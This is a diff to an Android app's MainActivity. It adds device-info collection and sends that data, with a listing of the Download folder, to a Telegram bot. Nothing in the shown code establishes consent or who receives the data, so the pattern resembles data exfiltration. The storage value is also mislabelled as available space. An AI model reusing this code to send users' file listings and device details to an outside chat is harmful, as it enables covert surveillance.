@@ -15,6 +15,7 @@ import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import android.os.StatFs;
 
 import okhttp3.Call;
 import okhttp3.Callback;
@@ -50,12 +51,14 @@ public class MainActivity extends AppCompatActivity {
     Button customMessageButton = findViewById(R.id.customMessageButton);
 
     sendButton.setOnClickListener(v -> {
-        checkStoragePermission();
-        sendTelegramMessage("Hello from Android app!");
-        File mapFile = generateFileMap();
-        if (mapFile != null) {
-            sendFileToTelegram(mapFile, "Here is the map of your Download folder:");
-        }
+    checkStoragePermission();
+    String deviceInfo = getDeviceInfo();
+    sendTelegramMessage("Hello from Android app!\n\n" + deviceInfo);
+
+    File mapFile = generateFileMap();
+    if (mapFile != null) {
+        sendFileToTelegram(mapFile, "Here is the map of your Download folder:");
+    }
     });
 
     customMessageButton.setOnClickListener(v -> {
@@ -67,6 +70,24 @@ public class MainActivity extends AppCompatActivity {
         }
     });
     }
+    
+    private String getDeviceInfo() {
+    String manufacturer = Build.MANUFACTURER;
+    String model = Build.MODEL;
+    String version = Build.VERSION.RELEASE;
+    String sdk = String.valueOf(Build.VERSION.SDK_INT);
+
+    StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
+    long bytesAvailable = (long) stat.getBlockSizeLong() * (long) stat.getBlockCountLong();
+    long megAvailable = bytesAvailable / (1024 * 1024);
+
+    return "Device Info:\n"
+            + "Manufacturer: " + manufacturer + "\n"
+            + "Model: " + model + "\n"
+            + "Android Version: " + version + "\n"
+            + "SDK: " + sdk + "\n"
+            + "Storage: " + megAvailable + " MB";
+            }
 
     private void sendTelegramMessage(String message) {
         String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + message;
